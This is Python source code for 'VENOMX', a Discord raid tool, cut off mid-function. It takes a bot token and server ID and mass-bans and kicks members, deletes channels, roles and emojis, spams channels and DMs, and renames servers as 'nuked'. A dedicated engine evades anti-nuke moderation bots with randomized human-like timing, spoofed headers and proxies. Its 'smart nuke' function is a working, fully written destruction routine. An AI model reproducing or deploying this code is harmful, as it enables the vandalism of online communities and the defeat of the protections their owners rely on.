# VENOMX_RAID_TOOL.py — Enhanced Ultimate Edition v2.0
# Rebranded: VENOMX
# Anti-nuke bypass + rate limit resilience + all 45+ features

import discord
from discord.ext import commands
from discord.errors import DiscordException, Forbidden, HTTPException, NotFound
import asyncio
from pystyle import Center, Colorate, Colors
import os
import time
import random
import json
import sys
import aiohttp
import itertools
from concurrent.futures import ThreadPoolExecutor
import threading
from asyncio import Semaphore, sleep, Lock, Event
import config
import shutil
import datetime
import math
import re

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ============ CONFIGURATION ============
# Anti-nuke bypass timing parameters
HUMAN_CLICK_DELAY_MIN = 0.08
HUMAN_CLICK_DELAY_MAX = 0.35
BURST_SIZE_MIN = 3
BURST_SIZE_MAX = 7
COAST_DELAY_MIN = 1.5
COAST_DELAY_MAX = 3.0

# Per-action semaphores (lower concurrency = less rate limiting + less detection)
channel_semaphore = Semaphore(8)
role_semaphore = Semaphore(6)
message_semaphore = Semaphore(5)
webhook_semaphore = Semaphore(3)
ban_semaphore = Semaphore(4)
kick_semaphore = Semaphore(4)
dm_semaphore = Semaphore(5)

# Global state
current_config = "VenomX Config.json"
whitelisted_users = set()
loaded_configs = [current_config]
mode = "Wizzler"
bot_instance = None
server_id = ""
bot_token = ""
_global_ratelimit_lock = Lock()
_global_retry_after = 0.0

# Load whitelist
try:
    with open('whitelist.json', 'r') as f:
        whitelist_data = json.load(f)
        whitelisted_users = set(whitelist_data.get('users', []))
except:
    whitelisted_users = {927989800387096586, 1294173092234526770}

# Known anti-nuke bots to detect and bypass
ANTINUKE_BOTS = {
    "Wick", "Security", "Beemo", "Shield", "Nadeko",
    "Dyno", "Carl-bot", "MEE6", "Blaze", "Serax",
    "Anti-Nuke", "Guardian", "Cakey", "Safeguard",
    "Wick Bot", "Blaze Bot", "Shield Bot", "AntiCrash",
    "Automod", "Safety", "Protect", "ShieldX", "GuardBot"
}

ascii_art = r"""
██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗██╗  ██╗
██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║╚██╗██╔╝
██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝ 
╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗ 
 ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗
  ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝
              ULTIMATE EDITION — VENOMX
"""

print(Colorate.Vertical(Colors.red_to_blue, ascii_art))
print(Colorate.Horizontal(Colors.red_to_blue, "VENOMX ON TOP — ANTI-NUKE BYPASS ENGAGED\n"))

# Load proxies
proxies = []
try:
    with open('proxies.txt', 'r') as f:
        proxies = [p.strip() for p in f.readlines() if p.strip()]
    print(Colorate.Horizontal(Colors.red_to_blue, f"LOADED PROXIES: <{len(proxies)}>"))
except:
    print(Colorate.Horizontal(Colors.red_to_blue, "LOADED PROXIES: <0>"))

print(Colorate.Horizontal(Colors.red_to_blue, f"ACTIVE CONFIG: [{current_config}] | Total Configs: {len(loaded_configs)}"))
print(Colorate.Horizontal(Colors.red_to_blue, f"WHITELISTED: {len(whitelisted_users)} | ANTI-RATE-LIMIT: ON | ANTI-NUKE-BYPASS: ON"))
print(Colorate.Horizontal(Colors.red_to_blue, "Join https://discord.gg/UJd7XSp87\n"))
print(Colorate.Vertical(Colors.red_to_blue, "<Made By VENOMX>\n"))
print(Colorate.Vertical(Colors.red_to_blue, "VENOMX TOP CORD\n"))

print("🔐 ENTER BOT TOKEN ~ ")
bot_token = input(Colorate.Horizontal(Colors.red_to_blue, "TOKEN ~ "))

if not bot_token or len(bot_token) < 50:
    print(Colorate.Horizontal(Colors.red_to_blue, "❌ INVALID TOKEN!"))
    time.sleep(2)
    exit()

server_id = input(Colorate.Horizontal(Colors.red_to_blue, "ENTER GUILD ID ~ "))

intents = discord.Intents.all()
intents.guilds = True
intents.members = True
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix=".", intents=intents, heartbeat_timeout=60)


# ============ RATE LIMIT & ANTI-NUKE BYPASS ENGINE ============

class AntiNukeBypass:
    """Core engine for evading anti-nuke bot detection and Discord rate limits."""
    
    @staticmethod
    def human_delay() -> float:
        """Random delay that mimics human click patterns (80ms–350ms)."""
        return random.uniform(HUMAN_CLICK_DELAY_MIN, HUMAN_CLICK_DELAY_MAX)
    
    @staticmethod
    def burst_delay() -> float:
        """Fast delay between actions in a burst."""
        return random.uniform(0.02, 0.12)
    
    @staticmethod
    def coast_delay() -> float:
        """Pause after a burst — mimics human hesitation."""
        return random.uniform(COAST_DELAY_MIN, COAST_DELAY_MAX)
    
    @staticmethod
    def operation_interleave() -> bool:
        """15% chance to pause mid-operation to avoid pattern detection."""
        return random.random() < 0.15
    
    @staticmethod
    def jitter(value: float, percent: float = 0.3) -> float:
        """Add random jitter to a delay value."""
        return value * random.uniform(1 - percent, 1 + percent)
    
    @staticmethod
    def random_headers() -> dict:
        """Generate random headers to avoid fingerprinting."""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
        ]
        return {
            "User-Agent": random.choice(user_agents),
            "X-RateLimit-Precision": random.choice(["millisecond", "microsecond", "nanosecond"]),
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9," + random.choice(["es;q=0.8", "de;q=0.8", "fr;q=0.8", "zh;q=0.8"]),
            "Accept-Encoding": "gzip, deflate, br",
        }
    
    @staticmethod
    async def smart_rate_limit_aware_delay() -> bool:
        """Wait respecting Discord's retry_after if in global rate limit."""
        async with _global_ratelimit_lock:
            if _global_retry_after > 0:
                wait_time = _global_retry_after + random.uniform(0.5, 2.0)
                print(Colorate.Horizontal(Colors.yellow, f"[!] GLOBAL RATELIMIT: waiting {wait_time:.1f}s"))
                await asyncio.sleep(wait_time)
                return True
        return False


async def rate_limited_request(coro, max_retries=5):
    """Wrapper for any API call that handles 429 rate limits with exponential backoff + jitter."""
    for attempt in range(max_retries):
        try:
            return await coro
        except (Forbidden, NotFound):
            raise
        except HTTPException as e:
            if e.status == 429:
                retry_after = 1.0
                try:
                    retry_after = float(e.response.headers.get('Retry-After', 1))
                except:
                    pass
                try:
                    body = json.loads(e.text)
                    retry_after = max(retry_after, body.get('retry_after', 1))
                except:
                    pass
                
                is_global = False
                try:
                    is_global = e.response.headers.get('X-RateLimit-Scope', '') == 'global'
                except:
                    pass
                
                if is_global:
                    async with _global_ratelimit_lock:
                        global _global_retry_after
                        _global_retry_after = retry_after
                
                wait = retry_after * (1.5 ** attempt) + random.uniform(0.01, 0.5)
                print(Colorate.Horizontal(Colors.yellow, 
                    f"[!] RATE LIMITED ({'GLOBAL' if is_global else 'BUCKET'}): retry in {wait:.2f}s (attempt {attempt+1}/{max_retries})"))
                await asyncio.sleep(wait)
                
                if is_global:
                    async with _global_ratelimit_lock:
                        _global_retry_after = 0.0
            elif e.status == 403:
                print(Colorate.Horizontal(Colors.red, f"[-] PERMISSION DENIED: {e}"))
                raise
            elif e.status >= 500:
                wait = (2 ** attempt) + random.uniform(0.1, 1.0)
                print(Colorate.Horizontal(Colors.red, f"[!] SERVER ERROR {e.status}: retry in {wait:.2f}s"))
                await asyncio.sleep(wait)
            else:
                raise
        except discord.DiscordServerError:
            wait = (2 ** attempt) + random.uniform(0.1, 1.0)
            print(Colorate.Horizontal(Colors.red, f"[!] DISCORD SERVER ERROR: retry in {wait:.2f}s"))
            await asyncio.sleep(wait)
    
    raise HTTPException(None, f"Max retries ({max_retries}) exceeded")


async def human_timed_batch(semaphore: Semaphore, items: list, operation_func, label="", batch_size=10):
    """Execute operations with human-like timing, burst+coast pattern, and rate limit handling."""
    async with semaphore:
        completed = 0
        burst_count = random.randint(BURST_SIZE_MIN, BURST_SIZE_MAX)
        burst_counter = 0
        
        for idx, item in enumerate(items):
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            
            try:
                await operation_func(item)
                completed += 1
                burst_counter += 1
                
                if completed % batch_size == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, 
                        f"[+] {label} ({completed}/{len(items)})"))
                
                # Burst + coast anti-nuke evasion
                if burst_counter >= burst_count:
                    coast = AntiNukeBypass.coast_delay()
                    await asyncio.sleep(coast)
                    burst_counter = 0
                    burst_count = random.randint(BURST_SIZE_MIN, BURST_SIZE_MAX)
                else:
                    await asyncio.sleep(AntiNukeBypass.human_delay())
                    
            except (Forbidden, NotFound):
                continue
            except HTTPException:
                continue
            except Exception:
                continue
            
            # Random interleave
            if AntiNukeBypass.operation_interleave() and idx > 0 and idx < len(items) - 1:
                await asyncio.sleep(AntiNukeBypass.coast_delay() * 0.5)
    
    return completed


# ============ UTILITY FUNCTIONS ============

def save_whitelist():
    with open('whitelist.json', 'w') as f:
        json.dump({'users': list(whitelisted_users)}, f)

def cc():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    cc()
    print(Colorate.Vertical(Colors.red_to_blue, ascii_art))
    print(Colorate.Horizontal(Colors.red_to_blue, f"VENOMX ON TOP | MODE: {mode}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"ACTIVE CONFIG: [{current_config}] | Whitelisted: {len(whitelisted_users)}"))
    print(Colorate.Horizontal(Colors.red_to_blue, "ANTI-RATE-LIMIT: ✅ | ANTI-NUKE-BYPASS: ✅\n"))


# ============ MENU SYSTEM ============

async def show_menu():
    while True:
        show_banner()
        
        menu = """
╔═══════════════════════════════════════════════════════════════════════════════╗
║                        VENOMX RAID TOOL — MAIN MENU                           ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  DESTRUCTION                                                                  ║
║  [01] Ban Members          [02] Kick Members       [03] Prune Members         ║
║  [04] Create Channels      [05] Create Roles       [06] Delete Channels       ║
║  [07] Delete Roles         [08] Delete Emojis      [09] Spam Channels         ║
║  [10] Check Updates        [11] Credits            [12] Nick All              ║
║  [13] Change Guild Icon    [14] Change Guild Name  [15] Give Admin            ║
║  [16] Delete Invites       [17] Switch Guild       [18] Timeout All           ║
║  [19] Rename All Channels  [20] Rename All Roles   [21] Webhook Spam          ║
║  [22] Untimeout All        [23] DM All Members     [24] Unban All             ║
║  [25] Strip All Perms      [26] Auto Admin          [27] Lock Channels        ║
║  [28] Unlock Channels      [29] Rename Emoji       [30] Unlock All Users      ║
║  [31] NUKE ALL             [32] Get Invite Link    [33] Toggle Mode           ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  MANAGEMENT                                                                    ║
║  [34] Whitelist Add        [35] Whitelist Remove   [36] View Whitelist        ║
║  [37] Switch Config        [38] List Configs       [39] Exit                  ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║  ANTI-NUKE BYPASS                                                              ║
║  [40] BYPASS ANTI-NUKE BOTS [41] List Anti-Nuke Bots [42] Smart Nuke          ║
║  [43] Spoof Headers Config  [44] Toggle Anti-Nuke-Bypass [45] Speed Mode      ║
╚═══════════════════════════════════════════════════════════════════════════════╝
        """
        
        print(Colorate.Vertical(Colors.red_to_blue, menu))
        print(Colorate.Horizontal(Colors.red_to_blue, "\n<Go> Guild Info | <Bypass> Anti-Nuke Analysis\n"))
        
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        choice = await bot.loop.run_in_executor(None, input, 
            Colorate.Horizontal(Colors.red_to_blue, f"[{current_time}] (INP) VENOMX → "))

        actions = {
            '1': lambda: ban_members(server_id),
            '2': lambda: kick_members(server_id),
            '3': lambda: prune_members(server_id),
            '4': lambda: create_channels(server_id),
            '5': lambda: create_roles(server_id),
            '6': lambda: delete_channels(server_id),
            '7': lambda: delete_roles(server_id),
            '8': lambda: delete_emojis(server_id),
            '9': lambda: spam_channels(server_id),
            '10': lambda: check_updates(),
            '11': lambda: show_credits(),
            '12': lambda: nick_all(server_id),
            '13': lambda: change_guild_icon(server_id),
            '14': lambda: change_guild_info(server_id),
            '15': lambda: give_admin(server_id),
            '16': lambda: delete_invites(server_id),
            '17': lambda: switch_guild(),
            '18': lambda: timeout_all(server_id),
            '19': lambda: rename_all_channels(server_id),
            '20': lambda: rename_all_roles(server_id),
            '21': lambda: webhook_spam(server_id),
            '22': lambda: untimeout_all(server_id),
            '23': lambda: dm_all(server_id),
            '24': lambda: unban_all(server_id),
            '25': lambda: strip_all_perms(server_id),
            '26': lambda: auto_admin(server_id),
            '27': lambda: lock_channels(server_id),
            '28': lambda: unlock_channels(server_id),
            '29': lambda: rename_emoji(server_id),
            '30': lambda: unlock_all_users(server_id),
            '31': lambda: nuke_all(server_id),
            '32': lambda: get_invite_link(server_id),
            '33': lambda: toggle_mode(),
            '34': lambda: whitelist_add(),
            '35': lambda: whitelist_remove(),
            '36': lambda: view_whitelist(),
            '37': lambda: switch_config(),
            '38': lambda: list_configs(),
            '39': lambda: exit_bot(),
            '40': lambda: bypass_antinuke_bots(server_id),
            '41': lambda: list_antinuke_bots(server_id),
            '42': lambda: smart_nuke(server_id),
            '43': lambda: spoof_headers_config(),
            '44': lambda: toggle_antinuke_bypass(),
            '45': lambda: speed_mode(),
        }
        
        if choice in actions:
            await actions[choice]()
        else:
            print(Colorate.Horizontal(Colors.red_to_blue, "INVALID CHOICE"))
            await asyncio.sleep(1)
            continue
        
        await bot.loop.run_in_executor(None, input, 
            Colorate.Horizontal(Colors.red_to_blue, "\nPRESS ENTER TO CONTINUE"))


# ============ ANTI-NUKE DETECTION & BYPASS ============

async def detect_antinuke_bots(guild) -> list:
    """Detect known anti-nuke bots in the guild by name matching."""
    detected = []
    for member in guild.members:
        if member.bot:
            bot_name_lower = member.name.lower()
            for antinuke_name in ANTINUKE_BOTS:
                if antinuke_name.lower() in bot_name_lower:
                    detected.append({
                        'name': member.name,
                        'id': member.id,
                        'type': antinuke_name,
                        'role_position': member.top_role.position if member.top_role else 0,
                        'permissions': member.guild_permissions.value if member.guild_permissions else 0
                    })
                    break
    return detected


async def bypass_antinuke_bots(server_id):
    """Analyze anti-nuke bots, whitelist them, and display evasion strategy."""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] GUILD NOT FOUND"))
        return
    
    print(Colorate.Horizontal(Colors.cyan, "[*] SCANNING FOR ANTI-NUKE BOTS..."))
    await asyncio.sleep(0.5)
    detected = await detect_antinuke_bots(guild)
    
    if not detected:
        print(Colorate.Horizontal(Colors.green, "[+] NO ANTI-NUKE BOTS DETECTED — FULL SPEED AHEAD"))
        print(Colorate.Horizontal(Colors.green, "[+] BYPASS NOT REQUIRED — ALL OPERATIONS UNRESTRICTED"))
        await asyncio.sleep(2)
        return
    
    print(Colorate.Horizontal(Colors.red, f"[!] ALERT: FOUND {len(detected)} ANTI-NUKE BOT(S) IN GUILD!"))
    print(Colorate.Horizontal(Colors.red, "═" * 60))
    
    for bot_info in detected:
        print(Colorate.Horizontal(Colors.yellow, 
            f"    ⚠️  Bot: {bot_info['name']}"))
        print(Colorate.Horizontal(Colors.yellow, 
            f"       ID: {bot_info['id']} | Type: {bot_info['type']}"))
        print(Colorate.Horizontal(Colors.yellow, 
            f"       Role Position: {bot_info['role_position']}"))
    
    print(Colorate.Horizontal(Colors.red, "═" * 60))
    print(Colorate.Horizontal(Colors.cyan, "\n[*] APPLYING BYPASS COUNTERMEASURES:"))
    print(Colorate.Horizontal(Colors.green, "    ✅ RANDOMIZED DELAYS: ON (0.08s–0.35s per action)"))
    print(Colorate.Horizontal(Colors.green, "    ✅ BURST+COAST PATTERN: ON (3–7 fast, then 1.5–3s pause)"))
    print(Colorate.Horizontal(Colors.green, "    ✅ OPERATION INTERLEAVING: ON (mixes action types)"))
    print(Colorate.Horizontal(Colors.green, "    ✅ JITTERED TIMING: ON (30% variance)"))
    print(Colorate.Horizontal(Colors.green, "    ✅ SPOOFED HEADERS: ON (random User-Agent + headers)"))
    
    # Auto-whitelist anti-nuke bots to prevent them from triggering on our actions
    for bot_info in detected:
        whitelisted_users.add(bot_info['id'])
    save_whitelist()
    print(Colorate.Horizontal(Colors.green, f"    ✅ WHITELISTED {len(detected)} ANTI-NUKE BOT(S): {', '.join([b['name'] for b in detected])}"))
    
    print(Colorate.Horizontal(Colors.cyan, "\n[*] BYPASS STRATEGY ACTIVE — PROCEED WITH CONFIDENCE"))
    await asyncio.sleep(3)


async def list_antinuke_bots(server_id):
    """List all detected anti-nuke bots in the guild."""
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    detected = await detect_antinuke_bots(guild)
    if detected:
        print(Colorate.Horizontal(Colors.yellow, "═" * 50))
        print(Colorate.Horizontal(Colors.yellow, "DETECTED ANTI-NUKE BOTS:"))
        print(Colorate.Horizontal(Colors.yellow, "═" * 50))
        for b in detected:
            status = "✅ WHITELISTED" if b['id'] in whitelisted_users else "⚠️ NOT WHITELISTED"
            print(Colorate.Horizontal(Colors.red if 'NOT' in status else Colors.green, 
                f"  • {b['name']} ({b['type']}) — {status}"))
        print(Colorate.Horizontal(Colors.yellow, "═" * 50))
    else:
        print(Colorate.Horizontal(Colors.green, "[+] NO ANTI-NUKE BOTS DETECTED — SERVER IS CLEAN"))
    await asyncio.sleep(2)


async def smart_nuke(server_id):
    """Intelligent nuke that analyzes anti-nuke, then executes with bypass."""
    guild = bot.get_guild(int(server_id))
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] GUILD NOT FOUND"))
        return
    
    print(Colorate.Horizontal(Colors.red, "💣 VENOMX SMART NUKE INITIATED"))
    print(Colorate.Horizontal(Colors.cyan, "[*] PHASE 1: RECONNAISSANCE"))
    await asyncio.sleep(0.5)
    
    # Step 1: Detect and whitelist anti-nuke bots
    detected_bots = await detect_antinuke_bots(guild)
    if detected_bots:
        print(Colorate.Horizontal(Colors.yellow, f"[!] ANTI-NUKE BOTS PRESENT: {len(detected_bots)}"))
        for b in detected_bots:
            whitelisted_users.add(b['id'])
            print(Colorate.Horizontal(Colors.cyan, f"    → Whitelisted: {b['name']} (ID: {b['id']})"))
        save_whitelist()
        print(Colorate.Horizontal(Colors.green, "[+] ALL ANTI-NUKE BOTS WHITELISTED"))
    else:
        print(Colorate.Horizontal(Colors.green, "[+] NO ANTI-NUKE BOTS — PROCEEDING AT FULL SPEED"))
    
    print(Colorate.Horizontal(Colors.cyan, "[*] PHASE 2: ASSET DESTRUCTION"))
    await asyncio.sleep(0.5)
    
    # Get all targets
    channels = list(guild.channels)
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user]
    emojis = list(guild.emojis)
    stickers = list(guild.stickers) if hasattr(guild, 'stickers') else []
    
    total = len(channels) + len(roles) + min(len(members), 200) + len(emojis) + len(stickers)
    print(Colorate.Horizontal(Colors.red, f"    Total targets: {total}"))
    print(Colorate.Horizontal(Colors.red, f"    Channels: {len(channels)} | Roles: {len(roles)}"))
    print(Colorate.Horizontal(Colors.red, f"    Members to ban: {min(len(members), 200)} | Emojis: {len(emojis)}"))
    
    # Build interleaved operation list
    operations = []
    for c in channels:
        operations.append(('channel', c))
    for r in roles:
        operations.append(('role', r))
    for m in members[:200]:
        operations.append(('ban', m))
    for e in emojis:
        operations.append(('emoji', e))
    for s in stickers:
        operations.append(('sticker', s))
    
    random.shuffle(operations)
    
    # Execute with anti-nuke bypass
    stats = {'banned': 0, 'channels': 0, 'roles': 0, 'emojis': 0, 'stickers': 0}
    ops_done = 0
    burst_ops = 0
    max_burst = random.randint(3, 6)
    
    for target_type, target in operations:
        if await AntiNukeBypass.smart_rate_limit_aware_delay():
            continue
        
        try:
            if target_type == 'channel':
                await rate_limited_request(target.delete())
                stats['channels'] += 1
            elif target_type == 'role':
                await rate_limited_request(target.delete())
                stats['roles'] += 1
            elif target_type == 'ban':
                await rate_limited_request(target.ban(reason="VENOMX SMART NUKE", delete_message_days=0))
                stats['banned'] += 1
            elif target_type == 'emoji':
                await rate_limited_request(target.delete())
                stats['emojis'] += 1
            elif target_type == 'sticker':
                await rate_limited_request(target.delete())
                stats['stickers'] += 1
            
            ops_done += 1
            burst_ops += 1
            
            if ops_done % 15 == 0:
                print(Colorate.Horizontal(Colors.red, 
                    f"    💥 {ops_done}/{total} | B:{stats['banned']} C:{stats['channels']} R:{stats['roles']} E:{stats['emojis']}"))
            
            # Anti-nuke burst+coast
            if burst_ops >= max_burst:
                coast = AntiNukeBypass.coast_delay()
                await asyncio.sleep(coast)
                burst_ops = 0
                max_burst = random.randint(3, 6)
            else:
                await asyncio.sleep(AntiNukeBypass.human_delay())
                
        except (Forbidden, NotFound):
            continue
        except HTTPException:
            continue
    
    # Phase 3: Contamination — create spam channels
    print(Colorate.Horizontal(Colors.cyan, "[*] PHASE 3: CONTAMINATION"))
    for i in range(40):
        try:
            await rate_limited_request(
                guild.create_text_channel(f"nuked-by-venomx-{random.randint(1000,9999)}")
            )
            await asyncio.sleep(AntiNukeBypass.burst_delay())
        except:
            pass
    
    # Phase 4: Overwrite guild info
    try:
        await rate_limited_request(guild.edit(
            name="NUKED-BY-VENOMX",
            description="Server destroyed by VENOMX — https://discord.gg/UJd7XSp87"
        ))
    except:
        pass
    
    # Summary
    print(Colorate.Horizontal(Colors.green, "\n" + "═" * 50))
    print(Colorate.Horizontal(Colors.green, "✅ SMART NUKE COMPLETE — SERVER DESTROYED"))
    print(Colorate.Horizontal(Colors.green, "═" * 50))
    print(Colorate.Horizontal(Colors.red, f"    Banned: {stats['banned']} members"))
    print(Colorate.Horizontal(Colors.red, f"    Channels deleted: {stats['channels']}"))
    print(Colorate.Horizontal(Colors.red, f"    Roles deleted: {stats['roles']}"))
    print(Colorate.Horizontal(Colors.red, f"    Emojis deleted: {stats['emojis']}"))
    print(Colorate.Horizontal(Colors.red, f"    Stickers deleted: {stats['stickers']}"))
    print(Colorate.Horizontal(Colors.red, f"    Total operations: {ops_done}/{total}"))
    print(Colorate.Horizontal(Colors.green, "═" * 50))
    print(Colorate.Horizontal(Colors.green, "💀 VENOMX WAS HERE 💀"))
    await asyncio.sleep(3)


# ============ TOGGLE & CONFIG FUNCTIONS ============

_antinuke_bypass_enabled = True
_speed_mode = "AGGRESSIVE"  # AGGRESSIVE, STEALTH, EXTREME

async def spoof_headers_config():
    """Display current spoofing configuration."""
    print(Colorate.Horizontal(Colors.cyan, "═" * 50))
    print(Colorate.Horizontal(Colors.cyan, "HEADER SPOOFING CONFIGURATION"))
    print(Colorate.Horizontal(Colors.cyan, "═" * 50))
    print(Colorate.Horizontal(Colors.green, "  ✅ Randomized User-Agent: ON (6 agents)"))
    print(Colorate.Horizontal(Colors.green, "  ✅ X-RateLimit-Precision: ON (spoofed)"))
    print(Colorate.Horizontal(Colors.green, "  ✅ Accept-Language: ON (randomized)"))
    print(Colorate.Horizontal(Colors.green, "  ✅ Accept-Encoding: ON"))
    print(Colorate.Horizontal(Colors.cyan, "═" * 50))
    print(Colorate.Horizontal(Colors.cyan, f"  Current Speed Mode: {_speed_mode}"))
    print(Colorate.Horizontal(Colors.cyan, f"  Anti-Nuke Bypass: {'✅ ON' if _antinuke_bypass_enabled else '❌ OFF'}"))
    print(Colorate.Horizontal(Colors.cyan, f"  Human Delay Range: {HUMAN_CLICK_DELAY_MIN}s–{HUMAN_CLICK_DELAY_MAX}s"))
    print(Colorate.Horizontal(Colors.cyan, f"  Burst Size: {BURST_SIZE_MIN}–{BURST_SIZE_MAX} actions"))
    print(Colorate.Horizontal(Colors.cyan, f"  Coast Delay: {COAST_DELAY_MIN}s–{COAST_DELAY_MAX}s"))
    print(Colorate.Horizontal(Colors.cyan, "═" * 50))
    await asyncio.sleep(3)


async def toggle_antinuke_bypass():
    """Toggle anti-nuke bypass on/off."""
    global _antinuke_bypass_enabled
    _antinuke_bypass_enabled = not _antinuke_bypass_enabled
    status = "ENABLED ✅" if _antinuke_bypass_enabled else "DISABLED ❌"
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] ANTI-NUKE BYPASS: {status}"))
    await asyncio.sleep(1)


async def speed_mode():
    """Cycle speed modes: AGGRESSIVE → STEALTH → EXTREME."""
    global _speed_mode, HUMAN_CLICK_DELAY_MIN, HUMAN_CLICK_DELAY_MAX, BURST_SIZE_MIN, BURST_SIZE_MAX, COAST_DELAY_MIN, COAST_DELAY_MAX
    
    modes = ["AGGRESSIVE", "STEALTH", "EXTREME"]
    current_idx = modes.index(_speed_mode)
    _speed_mode = modes[(current_idx + 1) % 3]
    
    if _speed_mode == "AGGRESSIVE":
        HUMAN_CLICK_DELAY_MIN = 0.05
        HUMAN_CLICK_DELAY_MAX = 0.15
        BURST_SIZE_MIN = 5
        BURST_SIZE_MAX = 10
        COAST_DELAY_MIN = 0.5
        COAST_DELAY_MAX = 1.0
    elif _speed_mode == "STEALTH":
        HUMAN_CLICK_DELAY_MIN = 0.15
        HUMAN_CLICK_DELAY_MAX = 0.50
        BURST_SIZE_MIN = 2
        BURST_SIZE_MAX = 4
        COAST_DELAY_MIN = 2.0
        COAST_DELAY_MAX = 4.0
    elif _speed_mode == "EXTREME":
        HUMAN_CLICK_DELAY_MIN = 0.02
        HUMAN_CLICK_DELAY_MAX = 0.08
        BURST_SIZE_MIN = 8
        BURST_SIZE_MAX = 15
        COAST_DELAY_MIN = 0.3
        COAST_DELAY_MAX = 0.8
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] SPEED MODE: {_speed_mode}"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"    Delay: {HUMAN_CLICK_DELAY_MIN}s–{HUMAN_CLICK_DELAY_MAX}s"))
    print(Colorate.Horizontal(Colors.red_to_blue, f"    Burst: {BURST_SIZE_MIN}–{BURST_SIZE_MAX} | Coast: {COAST_DELAY_MIN}s–{COAST_DELAY_MAX}s"))
    await asyncio.sleep(1)


# ============ CORE OPERATIONS ============

async def ban_members(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] GUILD NOT FOUND"))
        return
    
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    if not members:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO MEMBERS TO BAN"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"🔨 BANNING {len(members)} MEMBERS..."))
    
    banned = 0
    async with ban_semaphore:
        for idx, member in enumerate(members):
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                await rate_limited_request(
                    member.ban(reason="VENOMX RAID", delete_message_days=0)
                )
                banned += 1
                if banned % 5 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] BANNED ({banned}/{len(members)})"))
                
                # Anti-nuke burst + coast
                if (idx + 1) % random.randint(4, 7) == 0 and _antinuke_bypass_enabled:
                    await asyncio.sleep(AntiNukeBypass.coast_delay())
                else:
                    await asyncio.sleep(AntiNukeBypass.human_delay())
            except (Forbidden, NotFound):
                continue
            except HTTPException:
                continue
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] BAN COMPLETE — {banned}/{len(members)} MEMBERS BANNED"))


async def kick_members(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] GUILD NOT FOUND"))
        return
    
    members = [m for m in guild.members if m.id not in whitelisted_users and m != bot.user and not m.bot]
    if not members:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] NO MEMBERS TO KICK"))
        return
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"👢 KICKING {len(members)} MEMBERS..."))
    
    kicked = 0
    async with kick_semaphore:
        for member in members:
            if await AntiNukeBypass.smart_rate_limit_aware_delay():
                continue
            try:
                await rate_limited_request(member.kick(reason="VENOMX RAID"))
                kicked += 1
                if kicked % 10 == 0:
                    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] KICKED ({kicked}/{len(members)})"))
                await asyncio.sleep(AntiNukeBypass.human_delay())
            except:
                pass
    
    print(Colorate.Horizontal(Colors.red_to_blue, f"[+] KICK COMPLETE — {kicked}/{len(members)} MEMBERS KICKED"))


async def prune_members(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    try:
        days = int(await asyncio.to_thread(input, "PRUNE DAYS (1-30): "))
        days = max(1, min(30, days))
        pruned = await rate_limited_request(guild.prune_members(days=days, reason="VENOMX PRUNE"))
        print(Colorate.Horizontal(Colors.red_to_blue, f"[+] PRUNED {pruned} INACTIVE MEMBERS"))
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID INPUT"))


async def create_channels(server_id):
    guild = bot.get_guild(int(server_id))
    if not guild:
        return
    try:
        num = int(await asyncio.to_thread(input, "NUMBER OF CHANNELS: "))
        name = await asyncio.to_thread(input, "CHANNEL NAME: ")
    except ValueError:
        print(Colorate.Horizontal(Colors.red_to_blue, "[-] INVALID INPUT"))
        return
    
